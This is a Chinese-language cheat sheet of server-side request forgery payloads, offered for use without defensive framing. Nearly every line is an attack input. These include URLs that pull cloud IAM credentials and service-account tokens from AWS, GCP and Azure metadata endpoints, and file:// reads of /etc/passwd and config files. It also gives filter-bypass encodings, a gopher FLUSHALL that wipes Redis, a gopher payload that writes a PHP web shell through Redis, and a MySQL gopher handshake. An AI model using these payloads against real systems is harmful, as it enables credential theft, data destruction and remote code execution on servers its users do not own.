# SSRF服务端请求伪造

## 1. 基础SSRF攻击

```
http://target.com/url?url=http://internal-server/
http://target.com/url?url=file:///etc/passwd
http://target.com/url?url=ftp://internal-server/
```

## 2. 云元数据攻击

### AWS元数据

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### GCP元数据

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure元数据

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute
```

## 3. 协议利用

### Gopher攻击

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_FLUSHALL
```

### Dict协议

```
dict://localhost:11211/stats
dict://127.0.0.1:3306/
```

### File协议

```
file:///etc/passwd
file:///var/www/html/config.php
```

## 4. SSRF绕过技术

### IP地址绕过

```
127.0.0.1
127.1
0x7f000001
2130706433 (十进制)
localhost
```

### DNS重绑定

- 第一次DNS解析为白名单域名
- 第二次DNS解析为内网IP

### 协议绕过

```
dict://
gopher://
ftp://
```

### URL解析绕过

```
http://evil.com@127.0.0.1
http://127.0.0.1.evil.com
http://127。0。0。1
http://127.0.0.1.xip.io
```

## 5. 攻击Redis

```
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE
```

## 6. 攻击MySQL

```
gopher://127.0.0.1:3306/_%a5%00%00%01%8f%e0%00%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00%00mysql%20_native_password%00%02_password%00%0f%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
```
